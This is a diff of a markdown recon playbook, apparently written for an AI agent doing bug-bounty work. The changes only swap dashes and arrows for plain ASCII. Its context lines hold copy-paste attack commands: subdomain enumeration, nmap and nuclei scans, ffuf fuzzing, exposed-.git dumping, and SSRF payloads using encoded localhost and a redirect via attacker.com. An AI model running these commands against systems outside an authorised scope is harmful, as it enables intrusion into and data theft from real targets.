@@ -1,8 +1,8 @@
-## SPEED COMMANDS ARSENAL — COPY-PASTE READY
+## SPEED COMMANDS ARSENAL - COPY-PASTE READY
 
 **Fast hunting = right commands, run in parallel, no time wasted typing.**
 
-### RECON BLITZ (run ALL in parallel — 4 Bash calls in one message):
+### RECON BLITZ (run ALL in parallel - 4 Bash calls in one message):
 
 ```bash
 # CMD 1: Subdomain enum
@@ -18,7 +18,7 @@ feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-
 nmap -sV -sC --top-ports 1000 -T4 TARGET -oN nmap.txt
 ```
 
-### FAST INITIAL PROBE (run ALL in parallel — one message):
+### FAST INITIAL PROBE (run ALL in parallel - one message):
 
 ```bash
 # CMD 1: Homepage + tech fingerprint
@@ -84,7 +84,7 @@ curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://0x7f00000
 curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://attacker.com/redirect?to=http://127.0.0.1"
 ```
 
-### PARAMETER FUZZING (background — long running):
+### PARAMETER FUZZING (background - long running):
 
 ```bash
 # Content discovery with custom wordlist (run in background)
@@ -100,7 +100,7 @@ ffuf -u "https://TARGET/" -H "Host: FUZZ.TARGET" -w /usr/share/seclists/Discover
 ### NUCLEI TARGETED SCAN (background):
 
 ```bash
-# Critical + High templates only — not full scan
+# Critical + High templates only - not full scan
 nuclei -u https://TARGET -severity critical,high -o nuclei_results.txt
 
 # Technology-specific
@@ -152,14 +152,14 @@ curl -sk "https://storage.googleapis.com/TARGET/"
 ```bash
 # Check if .git is exposed
 curl -sk -x http://127.0.0.1:8080 "https://TARGET/.git/HEAD"
-# If 200 → dump the repo:
+# If 200 -> dump the repo:
 # git-dumper https://TARGET/.git/ ./git_dump (install: pip install git-dumper)
 ```
 
-### COMMAND CHAINING — FULL AUTO RECON (run as single background task):
+### COMMAND CHAINING - FULL AUTO RECON (run as single background task):
 
 ```bash
-# Full recon pipeline — runs sequentially but as one background command
+# Full recon pipeline - runs sequentially but as one background command
 subfinder -d TARGET -silent -o subs.txt && \
 cat subs.txt | httpx -silent -o live.txt && \
 cat live.txt | katana -d 2 -jc -silent -o urls.txt && \
